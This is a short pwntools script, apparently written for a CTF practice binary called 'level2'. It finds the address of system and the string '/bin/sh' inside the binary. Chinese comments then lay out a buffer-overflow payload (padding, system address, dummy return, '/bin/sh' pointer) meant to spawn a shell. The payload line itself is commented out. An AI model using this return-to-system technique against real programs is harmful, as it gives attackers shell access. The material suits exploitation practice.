# -*- coding: utf-8 -*-
from pwn import *

elf = ELF('./level2')

junk = b'a' * (0x88+4)
system_addr = elf.symbols['system']
print("system_address=>", hex(system_addr), p32(system_addr))

# 定义你想要搜索的字节序列
pattern = b'/x31\xc0\x50\x68\x2f\x2f\x73\x68'
pattern = b'/bin/sh'

results = elf.search(pattern)
print("0=>", hex(next(results)))

for match in elf.search(pattern):
    print(f"Found pattern at address: 0x{match:x}", type(match))
    
print("==============")
# 使用elf.search进行搜索
addresses = [match for match in elf.search(pattern)]
 
# 打印出所有的匹配地址
for addr in addresses:
    print(f"Found pattern at address: 0x{addr:x}", type(addr))
    
#         buf+ebp   ret_addr           任意     参数
# payload = junk   +  p32(system_addr) + p32(0) + p32(bin_sh_addr)
#p32(0)为system函数的返回地址
#返回前已经执行了system('bin/sh')，所以这里可以任意填充
